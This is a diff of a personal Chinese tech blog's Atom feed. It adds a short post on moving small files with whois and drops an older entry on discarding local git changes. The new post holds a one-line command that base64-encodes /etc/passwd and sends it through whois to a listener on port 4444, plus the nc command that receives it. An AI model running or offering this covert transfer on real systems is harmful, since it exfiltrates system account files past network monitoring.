@@ -1,4 +1,12 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://firsh.me/" rel="alternate" type="text/html" /><updated>2019-08-27T09:36:30+08:00</updated><id>https://firsh.me/feed.xml</id><title type="html">张建新</title><subtitle>张建新个人博客,我没有生来天赋过人,只有对技术的虔诚。</subtitle><author><name>ZhangJianXin</name></author><entry><title type="html">Java实现DirectIo文件方式操作文件系统</title><link href="https://firsh.me/2019/08/07/linux-directio-java/" rel="alternate" type="text/html" title="Java实现DirectIo文件方式操作文件系统" /><published>2019-08-07T09:41:11+08:00</published><updated>2019-08-07T09:41:11+08:00</updated><id>https://firsh.me/2019/08/07/linux-directio-java</id><content type="html" xml:base="https://firsh.me/2019/08/07/linux-directio-java/">&lt;h2 id=&quot;场景&quot;&gt;场景&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://firsh.me/" rel="alternate" type="text/html" /><updated>2019-09-02T10:07:10+08:00</updated><id>https://firsh.me/feed.xml</id><title type="html">张建新</title><subtitle>张建新个人博客,我没有生来天赋过人,只有对技术的虔诚。</subtitle><author><name>ZhangJianXin</name></author><entry><title type="html">利用Whois传输小文件。</title><link href="https://firsh.me/2019/09/02/use-whois-send-file-hack/" rel="alternate" type="text/html" title="利用Whois传输小文件。" /><published>2019-09-02T10:03:13+08:00</published><updated>2019-09-02T10:03:13+08:00</updated><id>https://firsh.me/2019/09/02/use-whois-send-file-hack</id><content type="html" xml:base="https://firsh.me/2019/09/02/use-whois-send-file-hack/">&lt;p&gt;Linux利用Whois传输文件。&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;传输机：
+root@john:~# whois &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4444 &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | base64&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+接受机：
+root@john:/tmp# nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4444 | sed &lt;span class=&quot;s2&quot;&gt;&quot;s/ //g&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">Linux利用Whois传输文件。</summary></entry><entry><title type="html">Java实现DirectIo文件方式操作文件系统</title><link href="https://firsh.me/2019/08/07/linux-directio-java/" rel="alternate" type="text/html" title="Java实现DirectIo文件方式操作文件系统" /><published>2019-08-07T09:41:11+08:00</published><updated>2019-08-07T09:41:11+08:00</updated><id>https://firsh.me/2019/08/07/linux-directio-java</id><content type="html" xml:base="https://firsh.me/2019/08/07/linux-directio-java/">&lt;h2 id=&quot;场景&quot;&gt;场景&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;APIServer接口要求较高的并发，而且还要将数据文件存储到本地备份，在低消耗内存CPU情况下提高程序的运行速度以及稳定性。&lt;/li&gt;
   &lt;li&gt;相关文章 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://man7.org/linux/man-pages/man2/open.2.html&lt;/code&gt;&lt;/li&gt;
@@ -1138,22 +1146,4 @@ mount &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
 ***/&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">这只是一次突然需求导致的问题，解决的比较唐突，如果哪里有不对的地方欢迎指正，不希望误导他人。</summary></entry><entry><title type="html">git丢弃本地修改的所有文件（新增、删除、修改）</title><link href="https://firsh.me/2018/11/15/git-check-out-reject/" rel="alternate" type="text/html" title="git丢弃本地修改的所有文件（新增、删除、修改）" /><published>2018-11-15T17:03:19+08:00</published><updated>2018-11-15T17:03:19+08:00</updated><id>https://firsh.me/2018/11/15/git-check-out-reject</id><content type="html" xml:base="https://firsh.me/2018/11/15/git-check-out-reject/">&lt;h2 id=&quot;git丢弃本地修改的所有文件新增删除修改&quot;&gt;git丢弃本地修改的所有文件（新增、删除、修改）&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#本地所有修改的。没有的提交的，都返回到原来的状态&lt;/span&gt;
-git stash &lt;span class=&quot;c&quot;&gt;#把所有没有提交的修改暂存到stash里面。可用git stash pop回复。&lt;/span&gt;
-git reset &lt;span class=&quot;nt&quot;&gt;--hard&lt;/span&gt; HASH &lt;span class=&quot;c&quot;&gt;#返回到某个节点，不保留修改。&lt;/span&gt;
-git reset &lt;span class=&quot;nt&quot;&gt;--soft&lt;/span&gt; HASH &lt;span class=&quot;c&quot;&gt;#返回到某个节点。保留修改&lt;/span&gt;
-
-git clean &lt;span class=&quot;nt&quot;&gt;-df&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#返回到某个节点&lt;/span&gt;
-git clean &lt;span class=&quot;c&quot;&gt;#参数&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#显示 将要 删除的 文件 和  目录&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#删除 文件&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;-df&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#删除 文件 和 目录&lt;/span&gt;
-
-git checkout &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git clean &lt;span class=&quot;nt&quot;&gt;-xdf&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# 清除本地&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;原文：https://blog.csdn.net/leedaning/article/details/51304690&lt;/p&gt;
-
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">git丢弃本地修改的所有文件（新增、删除、修改）</summary></entry></feed>
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">这只是一次突然需求导致的问题，解决的比较唐突，如果哪里有不对的地方欢迎指正，不希望误导他人。</summary></entry></feed>
